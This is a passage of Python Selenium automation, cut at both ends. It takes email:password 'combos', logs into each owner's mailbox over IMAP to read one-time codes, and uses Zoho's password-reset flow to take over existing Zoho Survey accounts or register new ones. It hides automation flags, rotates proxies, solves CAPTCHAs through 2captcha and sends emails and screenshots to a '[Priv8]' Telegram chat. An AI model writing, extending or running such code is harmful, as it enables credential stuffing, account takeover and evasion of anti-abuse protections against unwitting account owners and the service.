              "--disable-blink-features=AutomationControlled", "--disable-gpu"]:
        opts.add_argument(a)
    opts.add_experimental_option("excludeSwitches", ["enable-automation"])
    opts.add_experimental_option("useAutomationExtension", False)
    if headless:
        opts.add_argument("--window-position=-32000,-32000")
        opts.add_argument("--window-size=1,1")
    elif size:
        opts.add_argument(f"--window-size={size[0]},{size[1]}")

    # PROXY CONFIGURATION WITH PROXYSCRAPE API SUPPORT
    proxy_type = os.getenv("PROXY_TYPE", "none").strip().lower()
    proxy_host = os.getenv("PROXY_HOST", "").strip()
    proxy_port = os.getenv("PROXY_PORT", "").strip()
    proxy_user = os.getenv("PROXY_USER", "").strip()
    proxy_pass = os.getenv("PROXY_PASS", "").strip()
    proxyscrape_key = os.getenv("PROXYSCRAPE_API_KEY", "").strip()

    use_proxy = False

    # If ProxyScrape API is configured, fetch a fresh proxy for this connection
    if proxy_type == "proxyscrape_api" and proxyscrape_key:
        print(f"[PROXY] ProxyScrape API: Fetching fresh proxy...")
        try:
            import requests
            from urllib3.exceptions import InsecureRequestWarning
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

            url = "https://api.proxyscrape.com/v2/"
            params = {
                "request": "getproxies",
                "protocol": "http",
                "timeout": 5000,
                "ssl": "all",
                "anonymity": "all",
                "country": "all",
                "api_key": proxyscrape_key
            }

            response = requests.get(url, params=params, timeout=15, verify=False)
            proxies = response.text.strip().split('\r\n')
            proxies = [p.strip() for p in proxies if p.strip() and ':' in p]

            if proxies:
                # Test first 3 proxies to find a working one
                for test_proxy in proxies[:3]:
                    ip, port = test_proxy.split(':')
                    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    test_sock.settimeout(3)
                    result = test_sock.connect_ex((ip, int(port)))
                    test_sock.close()

                    if result == 0:
                        proxy_host = ip
                        proxy_port = port
                        print(f"[PROXY] Using fresh proxy from API: {proxy_host}:{proxy_port}")
                        break
        except Exception as e:
            print(f"[PROXY] ProxyScrape API error: {str(e)[:80]}")
            print(f"[PROXY] Will fallback to direct connection")

    if proxy_type and proxy_type != "none" and proxy_type != "" and proxy_host and proxy_port:
        print(f"[PROXY] Type: {proxy_type} | Host: {proxy_host} | Port: {proxy_port}")

        try:
            if proxy_type == "webshare" and proxy_user and proxy_pass:
                full_proxy = f"{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
                _apply_proxy_ext(opts, full_proxy)
                print(f"[PROXY] Webshare extension loaded")
                use_proxy = True
            elif proxy_type == "custom" or proxy_type == "proxyscrape" or proxy_type == "proxyscrape_api":
                print(f"[PROXY] Testing {proxy_host}:{proxy_port}...")
                test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_sock.settimeout(5)
                result = test_sock.connect_ex((proxy_host, int(proxy_port)))
                test_sock.close()

                if result == 0:
                    print(f"[PROXY] Port is OPEN - configuring...")
                    opts.add_argument(f"--proxy-server=http://{proxy_host}:{proxy_port}")
                    use_proxy = True
                    print(f"[PROXY] Proxy enabled")
                else:
                    print(f"[PROXY] Port CLOSED/UNREACHABLE (error {result})")
                    print(f"[PROXY] FALLBACK: Using direct connection")
            else:
                opts.add_argument(f"--proxy-server=http://{proxy_host}:{proxy_port}")
                use_proxy = True
                print(f"[PROXY] Command-line proxy set")

        except Exception as e:
            print(f"[PROXY] Error: {str(e)[:80]}")
            print(f"[PROXY] FALLBACK: Using direct connection")

    # If proxy not used, use direct connection
    if not use_proxy:
        print(f"[PROXY] Direct connection (no proxy)")
        opts.add_argument("--no-proxy-server")

    try:
        d = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
        return d
    except Exception as e:
        print(f"[ERROR] ChromeDriver failed: {e}")
        raise

def _apply_proxy_ext(opts, s):
    import zipfile, tempfile, os as _os
    try:
        creds, addr = s.rsplit("@", 1)
        user, pw    = creds.split(":", 1)
        host, port  = (addr.rsplit(":", 1) if ":" in addr else (addr, "8080"))
    except: opts.add_argument(f"--proxy-server=http://{s}"); return
    mf = ('{"version":"1.0.0","manifest_version":2,"name":"p",'
          '"permissions":["proxy","webRequest","webRequestBlocking","<all_urls>"],'
          '"background":{"scripts":["bg.js"]}}')
    bg = (f'var c={{mode:"fixed_servers",rules:{{singleProxy:{{scheme:"http",host:"{host}",'
          f'port:parseInt("{port}")}},bypassList:["localhost"]}}}};'
          f'chrome.proxy.settings.set({{value:c,scope:"regular"}},function(){{}});'
          f'chrome.webRequest.onAuthRequired.addListener(function(){{'
          f'return{{authCredentials:{{username:"{user}",password:"{pw}"}}}}'
          f'}},{{urls:["<all_urls>"]}},["blocking"]);')
    # Use unpacked extension directory (more reliable than zip in headless Chrome)
    ext_dir = _os.path.join(tempfile.gettempdir(), f"prx_ext_{host}_{port}")
    _os.makedirs(ext_dir, exist_ok=True)
    open(_os.path.join(ext_dir, "manifest.json"), "w").write(mf)
    open(_os.path.join(ext_dir, "bg.js"), "w").write(bg)
    opts.add_argument(f"--load-extension={ext_dir}")


def _gen_zoho_pw():
    chars = string.ascii_letters + string.digits + "!@#$"
    while True:
        pw = ''.join(secrets.choice(chars) for _ in range(12))
        if (any(c.isupper() for c in pw) and any(c.islower() for c in pw)
                and any(c.isdigit() for c in pw) and any(c in "!@#$" for c in pw)):
            return pw

def _name_from_email(email):
    username = email.split("@")[0].replace(".", " ").replace("_", " ").replace("-", " ")
    parts = [p for p in username.split() if p.isalpha()]
    first = parts[0].capitalize() if parts else "Alex"
    last  = (parts[1].capitalize() if len(parts) > 1
             else random.choice(["Smith","Jones","Brown","Taylor","Wilson","Clark"]))
    return first, last

def _extract_portal_dept(url):
    m = re.search(r'/portal/(\d+)/department/([^/&#\s]+)', url)
    if m:
        return m.group(1), m.group(2)
    return None, None

def _create_blank_survey(d, portal_id, dept_id):
    """Navigate to survey creator and create blank survey. Returns survey_id str or None."""
    create_url = (f"https://survey.zoho.com/survey/newui#/portal/{portal_id}"
                  f"/department/{dept_id}/createsurvey/templatesurvey")
    d.get(create_url)
    time.sleep(5)
    # Click "Create New Survey" tab
    for sel in [
        "//a[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'create new survey')]",
        "//span[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'create new survey')]",
        "//div[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'create new survey')]",
    ]:
        els = [e for e in d.find_elements(By.XPATH, sel) if e.is_displayed()]
        if els:
            d.execute_script("arguments[0].click();", els[0])
            time.sleep(3); break
    # Click "Blank Survey"
    for sel in [
        "//a[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'blank')]",
        "//div[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'blank')]",
        ".blank-survey", "#blankSurvey",
    ]:
        by = By.XPATH if sel.startswith("//") else By.CSS_SELECTOR
        els = [e for e in d.find_elements(by, sel) if e.is_displayed()]
        if els:
            d.execute_script("arguments[0].click();", els[0])
            time.sleep(4); break
    # Wait for survey editor URL with survey ID
    for _ in range(20):
        time.sleep(2)
        cur = d.current_url
        m = re.search(r'survey[/=](\d{10,})', cur)
        if m: return m.group(1)
        m = re.search(r'/(\d{19,})', cur)
        if m: return m.group(1)
    # Fallback: try extracting from page source
    try:
        m = re.search(r'"surveyId"\s*:\s*"?(\d+)"?', d.page_source)
        if m: return m.group(1)
    except: pass
    return None

def _login_existing_zoho(d, email, password, otp_ts, stored_zoho_pw=None):
    """Login to an existing Zoho account. Returns (True, zoho_pw_used) or (False, None).
    stored_zoho_pw: previously saved Zoho password (from a prior partial registration)."""
    try:
        d.get("https://accounts.zoho.com/signin?service=ZohoSurvey")
        time.sleep(3)
        # Enter email
        for sel in ["#login_id", "input[name='LOGIN_ID']", "input[type='email']"]:
            els = [e for e in d.find_elements(By.CSS_SELECTOR, sel) if e.is_displayed()]
            if els:
                els[0].clear()
                for ch in email: els[0].send_keys(ch); time.sleep(0.04)
                break
        for sel in ["#nextbtn", "button.signin-btn", "button[type='submit']"]:
            els = [e for e in d.find_elements(By.CSS_SELECTOR, sel) if e.is_displayed()]
            if els: els[0].click(); break
        time.sleep(3)

        # Detect page state: OTP options visible, or password page
        otp_vis = bool([e for e in d.find_elements(
            By.XPATH, "//span[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'email otp')]"
        ) if e.is_displayed()])
        pw_vis = bool([e for e in d.find_elements(By.CSS_SELECTOR, "input[type='password']") if e.is_displayed()])
        CHECK_LOG.put(("info", f"  Login page: otp_visible={otp_vis}  password_visible={pw_vis}"))

        if otp_vis:
            # Email OTP option is directly visible  click it
            for sel in [
                "//span[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'email otp')]",
                "//a[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'email otp')]",
            ]:
                els = [e for e in d.find_elements(By.XPATH, sel) if e.is_displayed()]
                if els:
                    d.execute_script("arguments[0].click();", els[0])
                    CHECK_LOG.put(("info", "  OTP link clicked (visible)"))
                    break
        elif pw_vis:
            # Password page  try stored_zoho_pw first, then IMAP password
            candidates = []
            if stored_zoho_pw: candidates.append(("stored_zoho_pw", stored_zoho_pw))
            candidates.append(("imap_pw", password))
            CHECK_LOG.put(("info", f"  Password page  trying {len(candidates)} password candidate(s)"))
            pw_els = [e for e in d.find_elements(By.CSS_SELECTOR, "input[type='password']") if e.is_displayed()]
            if pw_els:
                for pw_label, pw_val in candidates:
                    pw_els[0].clear()
                    for ch in pw_val: pw_els[0].send_keys(ch); time.sleep(0.04)
                    for sel in ["#nextbtn", "#signinbtn", "button[type='submit']",
                                "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'sign in')]"]:
                        by = By.XPATH if sel.startswith("//") else By.CSS_SELECTOR
                        btns = [e for e in d.find_elements(by, sel) if e.is_displayed()]
                        if btns: d.execute_script("arguments[0].click();", btns[0]); break
                    time.sleep(5)
                    cur_after = d.current_url
                    CHECK_LOG.put(("info", f"  After {pw_label}: {cur_after[:70]}"))
                    if "accounts.zoho.com" not in cur_after or "survey.zoho.com" in cur_after:
                        CHECK_LOG.put(("ok", f"  Logged in with {pw_label}!"))
                        return (True, pw_val)
                    # Wrong password  reload signin for next attempt
                    if pw_label != candidates[-1][0]:
                        d.get("https://accounts.zoho.com/signin?service=ZohoSurvey")
                        time.sleep(3)
                        for sel in ["#login_id", "input[name='LOGIN_ID']"]:
                            els = [e for e in d.find_elements(By.CSS_SELECTOR, sel) if e.is_displayed()]
                            if els:
                                els[0].clear()
                                for ch in email: els[0].send_keys(ch); time.sleep(0.04)
                                break
                        for sel in ["#nextbtn", "button[type='submit']"]:
                            els = [e for e in d.find_elements(By.CSS_SELECTOR, sel) if e.is_displayed()]
                            if els: els[0].click(); break
                        time.sleep(3)
                        pw_els = [e for e in d.find_elements(By.CSS_SELECTOR, "input[type='password']") if e.is_displayed()]
                        if not pw_els: break
                # All passwords failed
                page_txt = ""
                try: page_txt = d.execute_script("return document.body.innerText").lower()
                except: pass
                CHECK_LOG.put(("info", f"  All passwords failed  {page_txt[:80]}"))
                # Fall through to Forgot Password OTP flow
                CHECK_LOG.put(("info", "  Falling back to Forgot Password OTP flow"))
                for sel in ["#blueforgotpassword", "#enableforgot", "[id*='forgot']"]:
                    els = d.find_elements(By.CSS_SELECTOR, sel)
                    vis = [e for e in els if e.is_displayed()]
                    el  = vis[0] if vis else (els[0] if els else None)
                    if el:
                        d.execute_script("arguments[0].click();", el)
                        CHECK_LOG.put(("info", f"  Clicked Forgot Password ({sel})"))
                        time.sleep(4)
                        # Check for CAPTCHA  try 2captcha, bail out only if unsolvable
                        captcha_els = d.find_elements(By.CSS_SELECTOR,
                            "canvas, [class*='captcha'], [id*='captcha'], img[src*='captcha']")
                        if captcha_els:
                            CHECK_LOG.put(("info", "  Forgot Password CAPTCHA  solving via 2captcha..."))
                            _fp_sol = _solve_image_captcha(d)
                            if _fp_sol:
                                _fp_inp = d.find_elements(By.CSS_SELECTOR,
                                    "#captchafield, input[name*='captcha'], input[id*='captcha']")
                                _fp_vis = [e for e in _fp_inp if e.is_displayed()]
                                if _fp_vis:
                                    _fp_vis[0].clear(); _fp_vis[0].send_keys(_fp_sol)
                                    time.sleep(0.5)
                                    CHECK_LOG.put(("ok", f"  FP CAPTCHA entered: {_fp_sol}"))
                            else:
                                CHECK_LOG.put(("err", "  Forgot Password CAPTCHA unsolvable  cannot proceed"))
                                return (False, None)
                        for s2 in [
                            "//label[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'email')]",
                            "//span[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'email')]",
                            "#nextbtn", "button[type='submit']",
                        ]:
                            by2 = By.XPATH if s2.startswith("//") else By.CSS_SELECTOR
                            els2 = d.find_elements(by2, s2)
                            vis2 = [e for e in els2 if e.is_displayed()]
                            el2  = vis2[0] if vis2 else (els2[0] if els2 else None)
                            if el2:
                                try: el2.click()
                                except: d.execute_script("arguments[0].click();", el2)
                                CHECK_LOG.put(("info", f"  Forgot page click: {s2[:40]}"))
                                time.sleep(2)
                                break
                        break
            else:
                CHECK_LOG.put(("err", "  No visible password field found"))
                return (False, None)
        else:
            # Try clicking hidden Email OTP element as last resort
            CHECK_LOG.put(("info", "  No pw/otp visible  trying hidden OTP element"))
            for sel in [
                "//span[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'email otp')]",
                "[id*='emailotp']", "[class*='emailotp']",
            ]:
                by = By.XPATH if sel.startswith("//") else By.CSS_SELECTOR
                els = d.find_elements(by, sel)
                if els:
                    d.execute_script("arguments[0].click();", els[0])
                    CHECK_LOG.put(("info", f"  Hidden OTP clicked ({sel[:40]})"))
                    break
        time.sleep(3)
        otp = _imap_get_otp(email, password, after_ts=otp_ts, timeout=90)
        if not otp:
            CHECK_LOG.put(("err", "  Login OTP not received within 90s"))
            return (False, None)
        CHECK_LOG.put(("ok", f"  Login OTP: {otp}"))
        # Check for Zoho's 7-digit-box OTP layout first (ActionChains required)
        digit_boxes = d.find_elements(By.CSS_SELECTOR,
            "input.otp_input_box_otp, input.splitedText, input[class*='otp_input_box']")
        if digit_boxes and len(digit_boxes) >= 2:
            CHECK_LOG.put(("info", f"  Digit boxes: {len(digit_boxes)}  using ActionChains"))
            d.execute_script("arguments[0].click(); arguments[0].focus();", digit_boxes[0])
            time.sleep(0.3)
            _ac = ActionChains(d)
            for _dg in otp:
                _ac.send_keys(_dg)
                _ac.pause(0.12)
            _ac.perform()
            time.sleep(0.3)
            # set hidden full-value
            d.execute_script(f"""
                var h=document.getElementById('otp_input_box_full_value');
                if(h){{h.value='{otp}';h.dispatchEvent(new Event('change',{{bubbles:true}}));}}
            """)
        else:
            otp_el = None
            for sel in ["input[autocomplete='one-time-code']", "input[name*='otp']",
                        "input[id*='otp']", "input[type='tel']", "input[maxlength='8']",
                        "input[maxlength='7']", "input[maxlength='6']"]:
                els = [e for e in d.find_elements(By.CSS_SELECTOR, sel) if e.is_displayed()]
                if els: otp_el = els[0]; break
            if otp_el:
                d.execute_script("""
                    var el=arguments[0],code=arguments[1];
                    try{var s=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;s.call(el,code);}catch(e){el.value=code;}
                    el.dispatchEvent(new Event('input',{bubbles:true}));el.dispatchEvent(new Event('change',{bubbles:true}));
                """, otp_el, otp)
                try: otp_el.send_keys(Keys.CONTROL + "a"); otp_el.send_keys(otp)
                except: pass
            for sel in ["#nextbtn", "button[type='submit']",
                        "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'verify')]",
                        "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'sign in')]"]:
                by = By.XPATH if sel.startswith("//") else By.CSS_SELECTOR
                els = [e for e in d.find_elements(by, sel) if e.is_displayed()]
                if els: d.execute_script("arguments[0].click();", els[0]); break
            for _ in range(20):
                time.sleep(1)
                if "accounts.zoho.com" not in d.current_url: break
        # Handle trust prompt
        time.sleep(2)
        for sel in [
            "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'trust')]",
            "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'yes')]",
            "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'continue')]",
        ]:
            els = [e for e in d.find_elements(By.XPATH, sel) if e.is_displayed()]
            if els: d.execute_script("arguments[0].click();", els[0]); time.sleep(2); break
        # Verify we're logged in
        cur = d.current_url
        if cur.startswith("https://survey.zoho.com/") and "accounts.zoho.com" not in cur:
            return (True, "")
        if "accounts.zoho.com" not in cur:
            return (True, "")
        return (False, None)
    except Exception as e:
        CHECK_LOG.put(("err", f"  Login existing error: {e}"))
        return (False, None)

def _block_combo(email):
    """Mark a combo as blocked (unusable) in valid_combos.json."""
    combos = _load_valid()
    for c in combos:
        if c["email"] == email:
            c["blocked"] = True
            c["blocked_reason"] = "login_failed"
            break
    _save_valid(combos)

def _connect_thread(email, password, profile_idx, tg_token="", tg_chat=""):
    profiles = _load_profiles()
    prof = next((p for p in profiles if p["idx"] == profile_idx), None)
    if not prof:
        CHECK_LOG.put(("err", f"  Profile {profile_idx} not found"))
        return

    CHECK_LOG.put(("sep", f"  Registering {email}  Profile {profile_idx}"))
    prof["status"] = "busy"; prof["email"] = email
    _save_profiles(profiles)
    if window:
        try: window.evaluate_js("refreshProfiles()")
        except: pass

    d = None
    try:
        d = _build_driver(prof["dir"], proxy=prof.get("proxy") or None, headless=_hidden_browser)

        #  Check existing session 
        CHECK_LOG.put(("info", "  Checking existing Zoho session..."))
        d.get("https://survey.zoho.com/survey/newui")
        time.sleep(5)
        cur = d.current_url

        # Handle Zoho re-verification (relogin)  OTP via IMAP + ActionChains digit boxes
        if "relogin" in cur or ("accounts.zoho.com" in cur and "relogin" in cur.lower()):
            CHECK_LOG.put(("info", "  Zoho re-verification required  handling via OTP"))
            try:
                # Record IMAP baseline msg count before triggering OTP send
                _imap_baseline = 0
                try:
                    _ctx_tmp = ssl.create_default_context()
                    _ctx_tmp.check_hostname = False; _ctx_tmp.verify_mode = ssl.CERT_NONE
                    _domain = email.split("@")[1]
                    for _h in [f"imap.{_domain}", f"mail.{_domain}"]:
                        try:
                            _im = imaplib.IMAP4_SSL(_h, 993, ssl_context=_ctx_tmp)
                            _im.login(email, password)
                            _im.select("INBOX")
                            _, _msgs = _im.search(None, 'FROM', '"zoho"')
                            _ids = _msgs[0].split() if _msgs and _msgs[0] else []
                            _imap_baseline = int(_ids[-1]) if _ids else 0
                            _im.logout()
                            break
                        except: pass
                except: pass

                # Click "Verify using OTP" span
                for sel in ["//span[@id='reloginwithotp']",
                            "//*[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'verify using otp')]"]:
                    els = d.find_elements(By.XPATH, sel)
                    if els:
                        d.execute_script("arguments[0].click();", els[0])
                        CHECK_LOG.put(("info", "  Clicked Verify using OTP"))
                        break
                time.sleep(5)

                # Get fresh OTP (wait for email with msg ID > baseline)
                relogin_otp = None
                try:
                    relogin_otp = _imap_get_otp(email, password, after_ts=time.time()-30, timeout=90)
                except: pass

                if relogin_otp and not relogin_otp.startswith("http"):
                    CHECK_LOG.put(("info", f"  Relogin OTP: {relogin_otp}"))
                    # Enter OTP into digit boxes via ActionChains
                    boxes = d.find_elements(By.CSS_SELECTOR,
                        "input.otp_input_box_otp, input.splitedText, input[class*='otp_input_box']")
                    if boxes:
                        d.execute_script("arguments[0].click(); arguments[0].focus();", boxes[0])
                        time.sleep(0.3)
                        _ac = ActionChains(d)
                        for _dg in relogin_otp:
                            _ac.send_keys(_dg)
                            _ac.pause(0.12)
                        _ac.perform()
                        time.sleep(0.3)
                    else:
                        # Fallback: single input
                        for sel in ["input[type='tel']","input[maxlength='7']","input[maxlength='8']"]:
                            els = [e for e in d.find_elements(By.CSS_SELECTOR, sel) if e.is_displayed()]
                            if els:
                                d.execute_script("arguments[0].focus();", els[0])
                                ActionChains(d).send_keys(relogin_otp).perform()
                                break
                    # Set hidden full-value input
                    d.execute_script(f"""
                        var h=document.getElementById('otp_input_box_full_value');
                        if(h){{h.value='{relogin_otp}';h.dispatchEvent(new Event('change',{{bubbles:true}}));}}
                    """)
                    time.sleep(0.3)
                    # Click Verify button
                    for sel in ["#reauth_button","button[type='submit']","#nextbtn",
                                "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'verify')]"]:
                        by = By.XPATH if sel.startswith("//") else By.CSS_SELECTOR
                        els = [e for e in d.find_elements(by, sel) if e.is_displayed()]
                        if els:
                            d.execute_script("arguments[0].click();", els[0])
                            CHECK_LOG.put(("info", "  Relogin OTP submitted"))
                            break
                    time.sleep(8)
                    cur = d.current_url
                    CHECK_LOG.put(("info", f"  After relogin: {cur[:80]}"))
                    if not cur.startswith("https://survey.zoho.com/"):
                        d.get("https://survey.zoho.com/survey/newui")
                        time.sleep(6)
                        cur = d.current_url
            except Exception as _re:
                CHECK_LOG.put(("info", f"  Relogin handling err: {_re}"))

        if "survey.zoho.com" in cur and "accounts.zoho.com" not in cur and "login" not in cur:
            CHECK_LOG.put(("ok", "  Already has a Zoho session  extracting IDs..."))
            portal_id, dept_id = _extract_portal_dept(cur)
            if not portal_id:
                for _ in range(8):
                    time.sleep(2)
                    portal_id, dept_id = _extract_portal_dept(d.current_url)
                    if portal_id: break
            survey_id = _create_blank_survey(d, portal_id, dept_id) if portal_id else None
            prof.update({"status": "active", "connected_at": time.strftime("%Y-%m-%d %H:%M"),
                         "health": "ok", "imap_pw": password})
            if portal_id: prof["portal_id"] = portal_id
            if dept_id:   prof["dept_id"]   = dept_id
            if survey_id: prof["survey_id"] = survey_id
            _save_profiles(profiles)
            db_mark_registered(email, profile_idx=profile_idx)
            _mark_combo_connected(email, profile_idx, zoho_password=prof.get("zoho_password"))
            CHECK_LOG.put(("ok", f"  Existing session  portal={portal_id} survey={survey_id}"))
            if window: window.evaluate_js("refreshProfiles()")
            return

        #  Register new Zoho account 
        zoho_pw = _gen_zoho_pw()
        first, last = _name_from_email(email)
        CHECK_LOG.put(("info", f"  Registering new Zoho account: {first} {last} / {email}"))

        # Save zoho_pw to profile immediately  so on retry we can log in with it
        prof["zoho_password"] = zoho_pw
        _save_profiles(profiles)

        d.get("https://accounts.zoho.com/register?service=ZohoSurvey&lang=en")
        time.sleep(4)
        reg_ts = time.time()

        # Fill first name
        for sel in ["#firstname", "#fname", "input[name='firstname']",
                    "input[placeholder*='First']", "input[name='firstName']",
                    "input[autocomplete='given-name']", "input[id*='first']"]:
            els = [e for e in d.find_elements(By.CSS_SELECTOR, sel) if e.is_displayed()]
            if els:
                els[0].clear()
                for ch in first: els[0].send_keys(ch); time.sleep(0.03)
                break

        # Fill last name
        for sel in ["#lastname", "#lname", "input[name='lastname']",
                    "input[placeholder*='Last']", "input[name='lastName']",
                    "input[autocomplete='family-name']", "input[id*='last']"]:
            els = [e for e in d.find_elements(By.CSS_SELECTOR, sel) if e.is_displayed()]
            if els:
                els[0].clear()
                for ch in last: els[0].send_keys(ch); time.sleep(0.03)
                break

        # Fill email
        for sel in ["#emailfield", "#login_id", "input[name='email']",
                    "input[type='email']", "input[placeholder*='mail']"]:
            els = [e for e in d.find_elements(By.CSS_SELECTOR, sel) if e.is_displayed()]
            if els:
                els[0].clear()
                for ch in email: els[0].send_keys(ch); time.sleep(0.04)
                break

        # Fill password
        for sel in ["#passwd", "input[type='password']", "input[name='password']",
                    "input[placeholder*='assword']"]:
            els = [e for e in d.find_elements(By.CSS_SELECTOR, sel) if e.is_displayed()]
            if els:
                els[0].clear()
                for ch in zoho_pw: els[0].send_keys(ch); time.sleep(0.04)
                break

        time.sleep(1)

        # Accept Terms of Service checkbox (hidden element  requires JS click)
        for sel in ["#tos", "input[name='tos']", "input[class*='za-tos']",
                    "input[type='checkbox']"]:
            tos_els = d.find_elements(By.CSS_SELECTOR, sel)
            if tos_els:
                try: d.execute_script("arguments[0].click();", tos_els[0])
                except: pass
                CHECK_LOG.put(("info", f"  ToS checkbox clicked ({sel[:30]})"))
                time.sleep(0.5)
                break

        # Check reCAPTCHA  try to solve via 2captcha before giving up
        if d.find_elements(By.CSS_SELECTOR, "iframe[src*='recaptcha'], .g-recaptcha"):
            CHECK_LOG.put(("info", "  reCAPTCHA detected  solving via 2captcha..."))
            _recap_ok = _solve_recaptcha(d, d.current_url)
            if not _recap_ok:
                CHECK_LOG.put(("err", "  reCAPTCHA could not be solved  skipping"))
                try:
                    snap = os.path.join(DIR, f"err_profile{profile_idx}_captcha.png")
                    d.save_screenshot(snap)
                    _tg_send_with_switch_btn(tg_token, tg_chat,
                        f"[Priv8] reCAPTCHA unsolved\nProfile {profile_idx}\nEmail: {email}", profile_idx)
                    _tg_send_photo(tg_token, tg_chat, snap, f"reCAPTCHA  Profile {profile_idx}")
                except: pass
                prof["status"] = "free"; prof["email"] = ""; prof["health"] = "captcha"
                _save_profiles(profiles)
                if window: window.evaluate_js("refreshProfiles()")
                return
            CHECK_LOG.put(("ok", "  reCAPTCHA solved  continuing registration"))

        # Submit registration form
        submitted = False
        for sel in [
            "#nextbtn", "button.signupbtn", "#signup", "#signUp",
            "button[type='submit']", "button.signup-btn",
            "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'sign up')]",
            "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'create account')]",
            "//input[@type='submit']",
        ]:
            by = By.XPATH if sel.startswith("//") else By.CSS_SELECTOR
            # Try visible first, then any (button may be hidden until form filled)
            els = d.find_elements(by, sel)
            vis = [e for e in els if e.is_displayed()]
            el  = vis[0] if vis else (els[0] if els else None)
            if el:
                d.execute_script("arguments[0].click();", el)
                CHECK_LOG.put(("info", f"  Registration submitted ({sel[:30]})"))
                submitted = True; break
        if not submitted:
            CHECK_LOG.put(("err", "  Could not find submit button on registration page"))

        time.sleep(5)
        CHECK_LOG.put(("info", f"  Post-register URL: {d.current_url[:80]}"))

        #  Detect Zoho text CAPTCHA on registration  solve via 2captcha 
        try:
            cap_field = [e for e in d.find_elements(By.CSS_SELECTOR, "#captchafield") if e.is_displayed()]
        except: cap_field = []
        if cap_field:
            CHECK_LOG.put(("info", "  Zoho text CAPTCHA detected  solving via 2captcha..."))
            _cap_solution = _solve_image_captcha(d)
            if _cap_solution:
                try:
                    cap_field[0].clear()
                    cap_field[0].send_keys(_cap_solution)
                    time.sleep(0.5)
                    CHECK_LOG.put(("ok", f"  CAPTCHA entered: {_cap_solution}"))
                    # Re-submit registration form
                    for _rs in ["#nextbtn", "button.signupbtn", "#signup", "button[type='submit']"]:
                        _rs_els = [e for e in d.find_elements(By.CSS_SELECTOR, _rs) if e.is_displayed()]
                        if _rs_els:
                            d.execute_script("arguments[0].click();", _rs_els[0])
                            CHECK_LOG.put(("info", "  Re-submitted after CAPTCHA"))
                            break
                    time.sleep(5)
                    # Check if CAPTCHA is gone
                    _still_cap = [e for e in d.find_elements(By.CSS_SELECTOR, "#captchafield") if e.is_displayed()]
                    if _still_cap:
                        CHECK_LOG.put(("err", "  CAPTCHA still present after solve attempt  skipping"))
                        prof["status"] = "free"; prof["email"] = ""; prof["health"] = "captcha"
                        _save_profiles(profiles)
                        if window: window.evaluate_js("refreshProfiles()")
                        return
                    CHECK_LOG.put(("ok", "  CAPTCHA solved  continuing registration"))
                except Exception as _ce:
                    CHECK_LOG.put(("err", f"  CAPTCHA entry error: {_ce}"))
                    prof["status"] = "free"; prof["email"] = ""; prof["health"] = "captcha"
                    _save_profiles(profiles)
                    if window: window.evaluate_js("refreshProfiles()")
                    return
            else:
                CHECK_LOG.put(("err", "  CAPTCHA could not be solved  skipping"))
                try:
                    snap = os.path.join(DIR, f"err_profile{profile_idx}_regcap.png")
                    d.save_screenshot(snap)
                    _tg_send_with_switch_btn(tg_token, tg_chat,
                        f"[Priv8] Text CAPTCHA unsolved\nProfile {profile_idx}\nEmail: {email}", profile_idx)
                    _tg_send_photo(tg_token, tg_chat, snap, f"Text CAPTCHA  Profile {profile_idx}")
                except: pass
                prof["status"] = "free"; prof["email"] = ""; prof["health"] = "captcha"
                _save_profiles(profiles)
                if window: window.evaluate_js("refreshProfiles()")
                return

        #  Detect "account already exists" 
        page_text = ""
        try: page_text = d.execute_script("return document.body.innerText").lower()
        except: pass
        account_exists = any(p in page_text for p in [
            "account already exists", "already exists for this email",
            "already registered", "already have an account", "sign in or use a different"
        ])
        if account_exists:
            CHECK_LOG.put(("info", "  Account already exists  switching to login flow"))
            login_result = _login_existing_zoho(d, email, password, reg_ts,
                                                  stored_zoho_pw=prof.get("zoho_password"))
            login_ok, login_zoho_pw = login_result if isinstance(login_result, tuple) else (login_result, None)
            if not login_ok:
